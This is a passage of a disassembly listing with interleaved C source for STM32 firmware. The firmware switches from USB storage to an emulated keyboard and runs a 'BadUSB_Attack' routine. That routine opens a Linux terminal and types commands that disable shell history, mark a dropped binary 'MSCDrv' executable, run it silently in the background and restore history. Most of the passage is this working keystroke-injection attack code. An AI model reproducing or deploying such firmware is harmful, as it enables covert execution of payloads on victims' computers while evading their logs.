 8000aca:	f7ff fb7f 	bl	80001cc <strlen>
 8000ace:	4603      	mov	r3, r0
 8000ad0:	461a      	mov	r2, r3
 8000ad2:	f107 0308 	add.w	r3, r7, #8
 8000ad6:	4413      	add	r3, r2
 8000ad8:	4a7b      	ldr	r2, [pc, #492]	; (8000cc8 <BadUSB_Attack+0x328>)
 8000ada:	461c      	mov	r4, r3
 8000adc:	4615      	mov	r5, r2
 8000ade:	cd0f      	ldmia	r5!, {r0, r1, r2, r3}
 8000ae0:	6020      	str	r0, [r4, #0]
 8000ae2:	6061      	str	r1, [r4, #4]
 8000ae4:	60a2      	str	r2, [r4, #8]
 8000ae6:	60e3      	str	r3, [r4, #12]
		strcat(AttackStr0, "exit\n");
 8000ae8:	f107 0308 	add.w	r3, r7, #8
 8000aec:	4618      	mov	r0, r3
 8000aee:	f7ff fb6d 	bl	80001cc <strlen>
 8000af2:	4603      	mov	r3, r0
 8000af4:	461a      	mov	r2, r3
 8000af6:	f107 0308 	add.w	r3, r7, #8
 8000afa:	4413      	add	r3, r2
 8000afc:	4a73      	ldr	r2, [pc, #460]	; (8000ccc <BadUSB_Attack+0x32c>)
 8000afe:	6810      	ldr	r0, [r2, #0]
 8000b00:	6018      	str	r0, [r3, #0]
 8000b02:	8892      	ldrh	r2, [r2, #4]
 8000b04:	809a      	strh	r2, [r3, #4]
		SimulateShortcutKey(Terminal, 3);
 8000b06:	f507 7386 	add.w	r3, r7, #268	; 0x10c
 8000b0a:	2103      	movs	r1, #3
 8000b0c:	4618      	mov	r0, r3
 8000b0e:	f7ff fe6b 	bl	80007e8 <SimulateShortcutKey>
		SimulateKeyStrokes(AttackStr0, strlen(AttackStr0), &PrintCnt);
 8000b12:	f107 0308 	add.w	r3, r7, #8
 8000b16:	4618      	mov	r0, r3
 8000b18:	f7ff fb58 	bl	80001cc <strlen>
 8000b1c:	4603      	mov	r3, r0
 8000b1e:	4619      	mov	r1, r3
 8000b20:	f107 0308 	add.w	r3, r7, #8
 8000b24:	4a6a      	ldr	r2, [pc, #424]	; (8000cd0 <BadUSB_Attack+0x330>)
 8000b26:	4618      	mov	r0, r3
 8000b28:	f7ff fe8a 	bl	8000840 <SimulateKeyStrokes>
		char AttackStr[256];
		strcpy(AttackStr, "!@#$%^&*()_+1234567890~`{}|:\"<>?[];',./ashdahskdhasjdeuwhuASDJDHJAJKDHBSXAHE\n");
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
	}
#endif
}
 8000b2c:	e0ba      	b.n	8000ca4 <BadUSB_Attack+0x304>
	}else if(stage == 1){
 8000b2e:	f507 7388 	add.w	r3, r7, #272	; 0x110
 8000b32:	f5a3 7386 	sub.w	r3, r3, #268	; 0x10c
 8000b36:	681b      	ldr	r3, [r3, #0]
 8000b38:	2b01      	cmp	r3, #1
 8000b3a:	f040 809d 	bne.w	8000c78 <BadUSB_Attack+0x2d8>
		uint8_t Terminal[3] = LinuxTerminal;
 8000b3e:	4a5c      	ldr	r2, [pc, #368]	; (8000cb0 <BadUSB_Attack+0x310>)
 8000b40:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8000b44:	6812      	ldr	r2, [r2, #0]
 8000b46:	4611      	mov	r1, r2
 8000b48:	8019      	strh	r1, [r3, #0]
 8000b4a:	3302      	adds	r3, #2
 8000b4c:	0c12      	lsrs	r2, r2, #16
 8000b4e:	701a      	strb	r2, [r3, #0]
		char AttackStr1[256] = {'\0'};
 8000b50:	f507 7388 	add.w	r3, r7, #272	; 0x110
 8000b54:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8000b58:	2200      	movs	r2, #0
 8000b5a:	601a      	str	r2, [r3, #0]
 8000b5c:	3304      	adds	r3, #4
 8000b5e:	22fc      	movs	r2, #252	; 0xfc
 8000b60:	2100      	movs	r1, #0
 8000b62:	4618      	mov	r0, r3
 8000b64:	f00c fb7e 	bl	800d264 <memset>
		strcat(AttackStr1, "set +o history\n");
 8000b68:	f107 0308 	add.w	r3, r7, #8
 8000b6c:	4618      	mov	r0, r3
 8000b6e:	f7ff fb2d 	bl	80001cc <strlen>
 8000b72:	4603      	mov	r3, r0
 8000b74:	461a      	mov	r2, r3
 8000b76:	f107 0308 	add.w	r3, r7, #8
 8000b7a:	4413      	add	r3, r2
 8000b7c:	4a4d      	ldr	r2, [pc, #308]	; (8000cb4 <BadUSB_Attack+0x314>)
 8000b7e:	461c      	mov	r4, r3
 8000b80:	4615      	mov	r5, r2
 8000b82:	cd0f      	ldmia	r5!, {r0, r1, r2, r3}
 8000b84:	6020      	str	r0, [r4, #0]
 8000b86:	6061      	str	r1, [r4, #4]
 8000b88:	60a2      	str	r2, [r4, #8]
 8000b8a:	60e3      	str	r3, [r4, #12]
		strcat(AttackStr1, "cd /home/user/Templates\n");
 8000b8c:	f107 0308 	add.w	r3, r7, #8
 8000b90:	4618      	mov	r0, r3
 8000b92:	f7ff fb1b 	bl	80001cc <strlen>
 8000b96:	4603      	mov	r3, r0
 8000b98:	461a      	mov	r2, r3
 8000b9a:	f107 0308 	add.w	r3, r7, #8
 8000b9e:	4413      	add	r3, r2
 8000ba0:	4a45      	ldr	r2, [pc, #276]	; (8000cb8 <BadUSB_Attack+0x318>)
 8000ba2:	461d      	mov	r5, r3
 8000ba4:	4614      	mov	r4, r2
 8000ba6:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8000ba8:	6028      	str	r0, [r5, #0]
 8000baa:	6069      	str	r1, [r5, #4]
 8000bac:	60aa      	str	r2, [r5, #8]
 8000bae:	60eb      	str	r3, [r5, #12]
 8000bb0:	cc03      	ldmia	r4!, {r0, r1}
 8000bb2:	6128      	str	r0, [r5, #16]
 8000bb4:	6169      	str	r1, [r5, #20]
 8000bb6:	7823      	ldrb	r3, [r4, #0]
 8000bb8:	762b      	strb	r3, [r5, #24]
		strcat(AttackStr1, "chmod 777 MSCDrv\n");
 8000bba:	f107 0308 	add.w	r3, r7, #8
 8000bbe:	4618      	mov	r0, r3
 8000bc0:	f7ff fb04 	bl	80001cc <strlen>
 8000bc4:	4603      	mov	r3, r0
 8000bc6:	461a      	mov	r2, r3
 8000bc8:	f107 0308 	add.w	r3, r7, #8
 8000bcc:	4413      	add	r3, r2
 8000bce:	4a41      	ldr	r2, [pc, #260]	; (8000cd4 <BadUSB_Attack+0x334>)
 8000bd0:	461d      	mov	r5, r3
 8000bd2:	4614      	mov	r4, r2
 8000bd4:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8000bd6:	6028      	str	r0, [r5, #0]
 8000bd8:	6069      	str	r1, [r5, #4]
 8000bda:	60aa      	str	r2, [r5, #8]
 8000bdc:	60eb      	str	r3, [r5, #12]
 8000bde:	8823      	ldrh	r3, [r4, #0]
 8000be0:	822b      	strh	r3, [r5, #16]
		strcat(AttackStr1, "./MSCDrv >/dev/null 2>&1 &\n");
 8000be2:	f107 0308 	add.w	r3, r7, #8
 8000be6:	4618      	mov	r0, r3
 8000be8:	f7ff faf0 	bl	80001cc <strlen>
 8000bec:	4603      	mov	r3, r0
 8000bee:	461a      	mov	r2, r3
 8000bf0:	f107 0308 	add.w	r3, r7, #8
 8000bf4:	4413      	add	r3, r2
 8000bf6:	4a38      	ldr	r2, [pc, #224]	; (8000cd8 <BadUSB_Attack+0x338>)
 8000bf8:	461d      	mov	r5, r3
 8000bfa:	4614      	mov	r4, r2
 8000bfc:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8000bfe:	6028      	str	r0, [r5, #0]
 8000c00:	6069      	str	r1, [r5, #4]
 8000c02:	60aa      	str	r2, [r5, #8]
 8000c04:	60eb      	str	r3, [r5, #12]
 8000c06:	cc07      	ldmia	r4!, {r0, r1, r2}
 8000c08:	6128      	str	r0, [r5, #16]
 8000c0a:	6169      	str	r1, [r5, #20]
 8000c0c:	61aa      	str	r2, [r5, #24]
		strcat(AttackStr1, "set -o history\n");
 8000c0e:	f107 0308 	add.w	r3, r7, #8
 8000c12:	4618      	mov	r0, r3
 8000c14:	f7ff fada 	bl	80001cc <strlen>
 8000c18:	4603      	mov	r3, r0
 8000c1a:	461a      	mov	r2, r3
 8000c1c:	f107 0308 	add.w	r3, r7, #8
 8000c20:	4413      	add	r3, r2
 8000c22:	4a29      	ldr	r2, [pc, #164]	; (8000cc8 <BadUSB_Attack+0x328>)
 8000c24:	461c      	mov	r4, r3
 8000c26:	4615      	mov	r5, r2
 8000c28:	cd0f      	ldmia	r5!, {r0, r1, r2, r3}
 8000c2a:	6020      	str	r0, [r4, #0]
 8000c2c:	6061      	str	r1, [r4, #4]
 8000c2e:	60a2      	str	r2, [r4, #8]
 8000c30:	60e3      	str	r3, [r4, #12]
		strcat(AttackStr1, "exit\n");
 8000c32:	f107 0308 	add.w	r3, r7, #8
 8000c36:	4618      	mov	r0, r3
 8000c38:	f7ff fac8 	bl	80001cc <strlen>
 8000c3c:	4603      	mov	r3, r0
 8000c3e:	461a      	mov	r2, r3
 8000c40:	f107 0308 	add.w	r3, r7, #8
 8000c44:	4413      	add	r3, r2
 8000c46:	4a21      	ldr	r2, [pc, #132]	; (8000ccc <BadUSB_Attack+0x32c>)
 8000c48:	6810      	ldr	r0, [r2, #0]
 8000c4a:	6018      	str	r0, [r3, #0]
 8000c4c:	8892      	ldrh	r2, [r2, #4]
 8000c4e:	809a      	strh	r2, [r3, #4]
		SimulateShortcutKey(Terminal, 3);
 8000c50:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8000c54:	2103      	movs	r1, #3
 8000c56:	4618      	mov	r0, r3
 8000c58:	f7ff fdc6 	bl	80007e8 <SimulateShortcutKey>
		SimulateKeyStrokes(AttackStr1, strlen(AttackStr1), &PrintCnt);
 8000c5c:	f107 0308 	add.w	r3, r7, #8
 8000c60:	4618      	mov	r0, r3
 8000c62:	f7ff fab3 	bl	80001cc <strlen>
 8000c66:	4603      	mov	r3, r0
 8000c68:	4619      	mov	r1, r3
 8000c6a:	f107 0308 	add.w	r3, r7, #8
 8000c6e:	4a18      	ldr	r2, [pc, #96]	; (8000cd0 <BadUSB_Attack+0x330>)
 8000c70:	4618      	mov	r0, r3
 8000c72:	f7ff fde5 	bl	8000840 <SimulateKeyStrokes>
}
 8000c76:	e015      	b.n	8000ca4 <BadUSB_Attack+0x304>
		strcpy(AttackStr, "!@#$%^&*()_+1234567890~`{}|:\"<>?[];',./ashdahskdhasjdeuwhuASDJDHJAJKDHBSXAHE\n");
 8000c78:	f107 0308 	add.w	r3, r7, #8
 8000c7c:	4a17      	ldr	r2, [pc, #92]	; (8000cdc <BadUSB_Attack+0x33c>)
 8000c7e:	4618      	mov	r0, r3
 8000c80:	4611      	mov	r1, r2
 8000c82:	234e      	movs	r3, #78	; 0x4e
 8000c84:	461a      	mov	r2, r3
 8000c86:	f00c fb19 	bl	800d2bc <memcpy>
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
 8000c8a:	f107 0308 	add.w	r3, r7, #8
 8000c8e:	4618      	mov	r0, r3
 8000c90:	f7ff fa9c 	bl	80001cc <strlen>
 8000c94:	4603      	mov	r3, r0
 8000c96:	4619      	mov	r1, r3
 8000c98:	f107 0308 	add.w	r3, r7, #8
 8000c9c:	4a0c      	ldr	r2, [pc, #48]	; (8000cd0 <BadUSB_Attack+0x330>)
 8000c9e:	4618      	mov	r0, r3
 8000ca0:	f7ff fdce 	bl	8000840 <SimulateKeyStrokes>
}
 8000ca4:	bf00      	nop
 8000ca6:	f507 7788 	add.w	r7, r7, #272	; 0x110
 8000caa:	46bd      	mov	sp, r7
 8000cac:	bdb0      	pop	{r4, r5, r7, pc}
 8000cae:	bf00      	nop
 8000cb0:	0800d484 	.word	0x0800d484
 8000cb4:	0800d378 	.word	0x0800d378
 8000cb8:	0800d388 	.word	0x0800d388
 8000cbc:	0800d3a4 	.word	0x0800d3a4
 8000cc0:	0800d3c0 	.word	0x0800d3c0
 8000cc4:	0800d3d0 	.word	0x0800d3d0
 8000cc8:	0800d3ec 	.word	0x0800d3ec
 8000ccc:	0800d3fc 	.word	0x0800d3fc
 8000cd0:	20000278 	.word	0x20000278
 8000cd4:	0800d404 	.word	0x0800d404
 8000cd8:	0800d418 	.word	0x0800d418
 8000cdc:	0800d434 	.word	0x0800d434

08000ce0 <main>:
/**
  * @brief  The application entry point.
  * @retval int
  */
int main(void)
{
 8000ce0:	b580      	push	{r7, lr}
 8000ce2:	b082      	sub	sp, #8
 8000ce4:	af00      	add	r7, sp, #0
  /* USER CODE END 1 */

  /* MCU Configuration--------------------------------------------------------*/

  /* Reset of all peripherals, Initializes the Flash interface and the Systick. */
  HAL_Init();
 8000ce6:	f000 fb3e 	bl	8001366 <HAL_Init>
  /* USER CODE BEGIN Init */

  /* USER CODE END Init */

  /* Configure the system clock */
  SystemClock_Config();
 8000cea:	f000 f85f 	bl	8000dac <SystemClock_Config>
  /* USER CODE BEGIN SysInit */

  /* USER CODE END SysInit */

  /* Initialize all configured peripherals */
  MX_GPIO_Init();
 8000cee:	f7ff fbf3 	bl	80004d8 <MX_GPIO_Init>
  MX_USART2_UART_Init();
 8000cf2:	f000 fa75 	bl	80011e0 <MX_USART2_UART_Init>
  MX_SPI1_Init();
 8000cf6:	f000 f90d 	bl	8000f14 <MX_SPI1_Init>
  /* USER CODE BEGIN 2 */
  int flag = 0;
 8000cfa:	2300      	movs	r3, #0
 8000cfc:	607b      	str	r3, [r7, #4]
  isMSC = 1;
 8000cfe:	4b27      	ldr	r3, [pc, #156]	; (8000d9c <main+0xbc>)
 8000d00:	2201      	movs	r2, #1
 8000d02:	601a      	str	r2, [r3, #0]
  uint32_t Flash_Busy;
  MX_USB_DEVICE_Init_MSC();
 8000d04:	f00b fca6 	bl	800c654 <MX_USB_DEVICE_Init_MSC>

  memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 8000d08:	220f      	movs	r2, #15
 8000d0a:	2100      	movs	r1, #0
 8000d0c:	4824      	ldr	r0, [pc, #144]	; (8000da0 <main+0xc0>)
 8000d0e:	f00c faa9 	bl	800d264 <memset>

  flag = 1;
 8000d12:	2301      	movs	r3, #1
 8000d14:	607b      	str	r3, [r7, #4]
  /* USER CODE END 2 */

  /* Infinite loop */
  /* USER CODE BEGIN WHILE */
  while(1){
	  InterruptTrap(&InterruptFlag);
 8000d16:	4823      	ldr	r0, [pc, #140]	; (8000da4 <main+0xc4>)
 8000d18:	f7ff fdfc 	bl	8000914 <InterruptTrap>
	  Flash_Busy = __HAL_FLASH_GET_FLAG(FLASH_FLAG_BSY);
 8000d1c:	4b22      	ldr	r3, [pc, #136]	; (8000da8 <main+0xc8>)
 8000d1e:	691b      	ldr	r3, [r3, #16]
 8000d20:	f403 3380 	and.w	r3, r3, #65536	; 0x10000
 8000d24:	2b00      	cmp	r3, #0
 8000d26:	bf14      	ite	ne
 8000d28:	2301      	movne	r3, #1
 8000d2a:	2300      	moveq	r3, #0
 8000d2c:	b2db      	uxtb	r3, r3
 8000d2e:	603b      	str	r3, [r7, #0]
	  switch(flag){
 8000d30:	687b      	ldr	r3, [r7, #4]
 8000d32:	2b01      	cmp	r3, #1
 8000d34:	d003      	beq.n	8000d3e <main+0x5e>
 8000d36:	687b      	ldr	r3, [r7, #4]
 8000d38:	2b02      	cmp	r3, #2
 8000d3a:	d01c      	beq.n	8000d76 <main+0x96>
		  }
		  flag = 0;
		  SwitchToMSC();
		  break;
	  default:
		  break;
 8000d3c:	e02c      	b.n	8000d98 <main+0xb8>
		  HAL_Delay(10000);
 8000d3e:	f242 7010 	movw	r0, #10000	; 0x2710
 8000d42:	f000 fb85 	bl	8001450 <HAL_Delay>
			  if(!Flash_Busy){
 8000d46:	683b      	ldr	r3, [r7, #0]
 8000d48:	2b00      	cmp	r3, #0
 8000d4a:	d1fc      	bne.n	8000d46 <main+0x66>
				  SwitchToHID();
 8000d4c:	f7ff fc32 	bl	80005b4 <SwitchToHID>
				  while(!TestHID())
 8000d50:	e003      	b.n	8000d5a <main+0x7a>
					  HAL_Delay(TestHIDSlot);
 8000d52:	f44f 707a 	mov.w	r0, #1000	; 0x3e8
 8000d56:	f000 fb7b 	bl	8001450 <HAL_Delay>
				  while(!TestHID())
 8000d5a:	f7ff fdf9 	bl	8000950 <TestHID>
 8000d5e:	4603      	mov	r3, r0
 8000d60:	2b00      	cmp	r3, #0
 8000d62:	d0f6      	beq.n	8000d52 <main+0x72>
				  BadUSB_Attack(0);
 8000d64:	2000      	movs	r0, #0
 8000d66:	f7ff fe1b 	bl	80009a0 <BadUSB_Attack>
				  break;
 8000d6a:	bf00      	nop
		  flag = 2;
 8000d6c:	2302      	movs	r3, #2
 8000d6e:	607b      	str	r3, [r7, #4]
		  SwitchToMSC();
 8000d70:	f7ff fc38 	bl	80005e4 <SwitchToMSC>
		  break;
 8000d74:	e010      	b.n	8000d98 <main+0xb8>
		  HAL_Delay(20000);
 8000d76:	f644 6020 	movw	r0, #20000	; 0x4e20
 8000d7a:	f000 fb69 	bl	8001450 <HAL_Delay>
			  if(!Flash_Busy){
 8000d7e:	683b      	ldr	r3, [r7, #0]
 8000d80:	2b00      	cmp	r3, #0
 8000d82:	d1fc      	bne.n	8000d7e <main+0x9e>
				  SwitchToHID();
 8000d84:	f7ff fc16 	bl	80005b4 <SwitchToHID>
				  BadUSB_Attack(1);
 8000d88:	2001      	movs	r0, #1
 8000d8a:	f7ff fe09 	bl	80009a0 <BadUSB_Attack>
				  break;
 8000d8e:	bf00      	nop
		  flag = 0;
 8000d90:	2300      	movs	r3, #0
 8000d92:	607b      	str	r3, [r7, #4]
		  SwitchToMSC();
 8000d94:	f7ff fc26 	bl	80005e4 <SwitchToMSC>
	  InterruptTrap(&InterruptFlag);
 8000d98:	e7bd      	b.n	8000d16 <main+0x36>
 8000d9a:	bf00      	nop
 8000d9c:	20000978 	.word	0x20000978
 8000da0:	2000025c 	.word	0x2000025c
 8000da4:	20000270 	.word	0x20000270
 8000da8:	40022000 	.word	0x40022000

08000dac <SystemClock_Config>:
/**
  * @brief System Clock Configuration
  * @retval None
  */
void SystemClock_Config(void)
{
 8000dac:	b580      	push	{r7, lr}
 8000dae:	b096      	sub	sp, #88	; 0x58
 8000db0:	af00      	add	r7, sp, #0
  RCC_OscInitTypeDef RCC_OscInitStruct = {0};
 8000db2:	f107 0314 	add.w	r3, r7, #20
 8000db6:	2244      	movs	r2, #68	; 0x44
 8000db8:	2100      	movs	r1, #0
 8000dba:	4618      	mov	r0, r3
 8000dbc:	f00c fa52 	bl	800d264 <memset>
  RCC_ClkInitTypeDef RCC_ClkInitStruct = {0};
 8000dc0:	463b      	mov	r3, r7
 8000dc2:	2200      	movs	r2, #0
 8000dc4:	601a      	str	r2, [r3, #0]
 8000dc6:	605a      	str	r2, [r3, #4]
 8000dc8:	609a      	str	r2, [r3, #8]
 8000dca:	60da      	str	r2, [r3, #12]
 8000dcc:	611a      	str	r2, [r3, #16]

  /** Configure the main internal regulator output voltage
  */
  if (HAL_PWREx_ControlVoltageScaling(PWR_REGULATOR_VOLTAGE_SCALE1) != HAL_OK)
 8000dce:	f44f 7000 	mov.w	r0, #512	; 0x200
 8000dd2:	f002 fe4f 	bl	8003a74 <HAL_PWREx_ControlVoltageScaling>
 8000dd6:	4603      	mov	r3, r0
 8000dd8:	2b00      	cmp	r3, #0
 8000dda:	d001      	beq.n	8000de0 <SystemClock_Config+0x34>
  {
    Error_Handler();
 8000ddc:	f000 f894 	bl	8000f08 <Error_Handler>
  }

  /** Configure LSE Drive Capability
  */
  HAL_PWR_EnableBkUpAccess();
 8000de0:	f002 fe2a 	bl	8003a38 <HAL_PWR_EnableBkUpAccess>
  __HAL_RCC_LSEDRIVE_CONFIG(RCC_LSEDRIVE_LOW);
 8000de4:	4b21      	ldr	r3, [pc, #132]	; (8000e6c <SystemClock_Config+0xc0>)
 8000de6:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8000dea:	4a20      	ldr	r2, [pc, #128]	; (8000e6c <SystemClock_Config+0xc0>)
 8000dec:	f023 0318 	bic.w	r3, r3, #24
 8000df0:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90

  /** Initializes the RCC Oscillators according to the specified parameters
  * in the RCC_OscInitTypeDef structure.
  */
  RCC_OscInitStruct.OscillatorType = RCC_OSCILLATORTYPE_LSE|RCC_OSCILLATORTYPE_MSI;
 8000df4:	2314      	movs	r3, #20
 8000df6:	617b      	str	r3, [r7, #20]
  RCC_OscInitStruct.LSEState = RCC_LSE_ON;
 8000df8:	2301      	movs	r3, #1
 8000dfa:	61fb      	str	r3, [r7, #28]
  RCC_OscInitStruct.MSIState = RCC_MSI_ON;
 8000dfc:	2301      	movs	r3, #1
 8000dfe:	62fb      	str	r3, [r7, #44]	; 0x2c
  RCC_OscInitStruct.MSICalibrationValue = 0;
 8000e00:	2300      	movs	r3, #0
 8000e02:	633b      	str	r3, [r7, #48]	; 0x30
  RCC_OscInitStruct.MSIClockRange = RCC_MSIRANGE_6;
 8000e04:	2360      	movs	r3, #96	; 0x60
 8000e06:	637b      	str	r3, [r7, #52]	; 0x34
  RCC_OscInitStruct.PLL.PLLState = RCC_PLL_ON;
 8000e08:	2302      	movs	r3, #2
 8000e0a:	63fb      	str	r3, [r7, #60]	; 0x3c
  RCC_OscInitStruct.PLL.PLLSource = RCC_PLLSOURCE_MSI;
 8000e0c:	2301      	movs	r3, #1
 8000e0e:	643b      	str	r3, [r7, #64]	; 0x40
  RCC_OscInitStruct.PLL.PLLM = 1;
 8000e10:	2301      	movs	r3, #1
 8000e12:	647b      	str	r3, [r7, #68]	; 0x44
  RCC_OscInitStruct.PLL.PLLN = 24;
 8000e14:	2318      	movs	r3, #24
 8000e16:	64bb      	str	r3, [r7, #72]	; 0x48
  RCC_OscInitStruct.PLL.PLLP = RCC_PLLP_DIV7;
 8000e18:	2307      	movs	r3, #7
 8000e1a:	64fb      	str	r3, [r7, #76]	; 0x4c
  RCC_OscInitStruct.PLL.PLLQ = RCC_PLLQ_DIV2;
 8000e1c:	2302      	movs	r3, #2
 8000e1e:	653b      	str	r3, [r7, #80]	; 0x50
  RCC_OscInitStruct.PLL.PLLR = RCC_PLLR_DIV2;
 8000e20:	2302      	movs	r3, #2
 8000e22:	657b      	str	r3, [r7, #84]	; 0x54
  if (HAL_RCC_OscConfig(&RCC_OscInitStruct) != HAL_OK)
 8000e24:	f107 0314 	add.w	r3, r7, #20
 8000e28:	4618      	mov	r0, r3
 8000e2a:	f002 fe89 	bl	8003b40 <HAL_RCC_OscConfig>
 8000e2e:	4603      	mov	r3, r0
 8000e30:	2b00      	cmp	r3, #0
 8000e32:	d001      	beq.n	8000e38 <SystemClock_Config+0x8c>
  {
    Error_Handler();
 8000e34:	f000 f868 	bl	8000f08 <Error_Handler>
  }

  /** Initializes the CPU, AHB and APB buses clocks
  */
  RCC_ClkInitStruct.ClockType = RCC_CLOCKTYPE_HCLK|RCC_CLOCKTYPE_SYSCLK
 8000e38:	230f      	movs	r3, #15
 8000e3a:	603b      	str	r3, [r7, #0]
                              |RCC_CLOCKTYPE_PCLK1|RCC_CLOCKTYPE_PCLK2;
  RCC_ClkInitStruct.SYSCLKSource = RCC_SYSCLKSOURCE_PLLCLK;
 8000e3c:	2303      	movs	r3, #3
 8000e3e:	607b      	str	r3, [r7, #4]
  RCC_ClkInitStruct.AHBCLKDivider = RCC_SYSCLK_DIV1;
 8000e40:	2300      	movs	r3, #0
 8000e42:	60bb      	str	r3, [r7, #8]
  RCC_ClkInitStruct.APB1CLKDivider = RCC_HCLK_DIV1;
 8000e44:	2300      	movs	r3, #0
 8000e46:	60fb      	str	r3, [r7, #12]
  RCC_ClkInitStruct.APB2CLKDivider = RCC_HCLK_DIV1;
 8000e48:	2300      	movs	r3, #0
 8000e4a:	613b      	str	r3, [r7, #16]

  if (HAL_RCC_ClockConfig(&RCC_ClkInitStruct, FLASH_LATENCY_2) != HAL_OK)
 8000e4c:	463b      	mov	r3, r7
 8000e4e:	2102      	movs	r1, #2
 8000e50:	4618      	mov	r0, r3
 8000e52:	f003 fa89 	bl	8004368 <HAL_RCC_ClockConfig>
 8000e56:	4603      	mov	r3, r0
 8000e58:	2b00      	cmp	r3, #0
 8000e5a:	d001      	beq.n	8000e60 <SystemClock_Config+0xb4>
  {
    Error_Handler();
 8000e5c:	f000 f854 	bl	8000f08 <Error_Handler>
  }

  /** Enable MSI Auto calibration
  */
  HAL_RCCEx_EnableMSIPLLMode();
 8000e60:	f003 fe9c 	bl	8004b9c <HAL_RCCEx_EnableMSIPLLMode>
}
 8000e64:	bf00      	nop
 8000e66:	3758      	adds	r7, #88	; 0x58
 8000e68:	46bd      	mov	sp, r7
 8000e6a:	bd80      	pop	{r7, pc}
 8000e6c:	40021000 	.word	0x40021000

08000e70 <HAL_TIM_PeriodElapsedCallback>:

/* USER CODE BEGIN 4 */
void HAL_TIM_PeriodElapsedCallback(TIM_HandleTypeDef *htim){
 8000e70:	b580      	push	{r7, lr}
 8000e72:	b082      	sub	sp, #8
 8000e74:	af00      	add	r7, sp, #0
 8000e76:	6078      	str	r0, [r7, #4]
	if(htim == &htim2){
 8000e78:	687b      	ldr	r3, [r7, #4]
 8000e7a:	4a1d      	ldr	r2, [pc, #116]	; (8000ef0 <HAL_TIM_PeriodElapsedCallback+0x80>)
 8000e7c:	4293      	cmp	r3, r2
 8000e7e:	d133      	bne.n	8000ee8 <HAL_TIM_PeriodElapsedCallback+0x78>
		if(InterruptCnt == 0){
 8000e80:	4b1c      	ldr	r3, [pc, #112]	; (8000ef4 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000e82:	681b      	ldr	r3, [r3, #0]
 8000e84:	2b00      	cmp	r3, #0
 8000e86:	d108      	bne.n	8000e9a <HAL_TIM_PeriodElapsedCallback+0x2a>
			//Simulate press operation
			Get_Single_Descriptor(128);
 8000e88:	2080      	movs	r0, #128	; 0x80
 8000e8a:	f7ff fbc1 	bl	8000610 <Get_Single_Descriptor>
			USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 8000e8e:	220f      	movs	r2, #15
 8000e90:	4919      	ldr	r1, [pc, #100]	; (8000ef8 <HAL_TIM_PeriodElapsedCallback+0x88>)
 8000e92:	481a      	ldr	r0, [pc, #104]	; (8000efc <HAL_TIM_PeriodElapsedCallback+0x8c>)
 8000e94:	f007 feec 	bl	8008c70 <USBD_CUSTOM_HID_SendReport>
 8000e98:	e018      	b.n	8000ecc <HAL_TIM_PeriodElapsedCallback+0x5c>
//			HAL_GPIO_WritePin(GPIOB, GPIO_PIN_3, GPIO_PIN_SET);
		}else if(InterruptCnt == 1){
 8000e9a:	4b16      	ldr	r3, [pc, #88]	; (8000ef4 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000e9c:	681b      	ldr	r3, [r3, #0]
 8000e9e:	2b01      	cmp	r3, #1
 8000ea0:	d10c      	bne.n	8000ebc <HAL_TIM_PeriodElapsedCallback+0x4c>
			//Simulate release operation
			SimulateKeyRelease();
 8000ea2:	f7ff fc79 	bl	8000798 <SimulateKeyRelease>
			//Judging whether to Interrupt
			if((recv_buffer[0]&0x02) != 0x02)
 8000ea6:	4b16      	ldr	r3, [pc, #88]	; (8000f00 <HAL_TIM_PeriodElapsedCallback+0x90>)
 8000ea8:	781b      	ldrb	r3, [r3, #0]
 8000eaa:	f003 0302 	and.w	r3, r3, #2
 8000eae:	2b00      	cmp	r3, #0
 8000eb0:	d10c      	bne.n	8000ecc <HAL_TIM_PeriodElapsedCallback+0x5c>
				InterruptCnt = -1;
 8000eb2:	4b10      	ldr	r3, [pc, #64]	; (8000ef4 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000eb4:	f04f 32ff 	mov.w	r2, #4294967295
 8000eb8:	601a      	str	r2, [r3, #0]
 8000eba:	e007      	b.n	8000ecc <HAL_TIM_PeriodElapsedCallback+0x5c>
//			HAL_GPIO_WritePin(GPIOB, GPIO_PIN_3, GPIO_PIN_RESET);
		}else{
			//off timer
			TIM2->CR1 &= ~TIM_CR1_CEN;
 8000ebc:	f04f 4380 	mov.w	r3, #1073741824	; 0x40000000
 8000ec0:	681b      	ldr	r3, [r3, #0]
 8000ec2:	f04f 4280 	mov.w	r2, #1073741824	; 0x40000000
 8000ec6:	f023 0301 	bic.w	r3, r3, #1
 8000eca:	6013      	str	r3, [r2, #0]
		}
		InterruptCnt = (InterruptCnt+1)%3;
 8000ecc:	4b09      	ldr	r3, [pc, #36]	; (8000ef4 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000ece:	681b      	ldr	r3, [r3, #0]
 8000ed0:	1c59      	adds	r1, r3, #1
 8000ed2:	4b0c      	ldr	r3, [pc, #48]	; (8000f04 <HAL_TIM_PeriodElapsedCallback+0x94>)
 8000ed4:	fb83 3201 	smull	r3, r2, r3, r1
 8000ed8:	17cb      	asrs	r3, r1, #31
 8000eda:	1ad2      	subs	r2, r2, r3
 8000edc:	4613      	mov	r3, r2
 8000ede:	005b      	lsls	r3, r3, #1
 8000ee0:	4413      	add	r3, r2
 8000ee2:	1aca      	subs	r2, r1, r3
 8000ee4:	4b03      	ldr	r3, [pc, #12]	; (8000ef4 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000ee6:	601a      	str	r2, [r3, #0]
	}
}
 8000ee8:	bf00      	nop
 8000eea:	3708      	adds	r7, #8
 8000eec:	46bd      	mov	sp, r7
 8000eee:	bd80      	pop	{r7, pc}
 8000ef0:	200002e4 	.word	0x200002e4
 8000ef4:	20000274 	.word	0x20000274
 8000ef8:	2000025c 	.word	0x2000025c
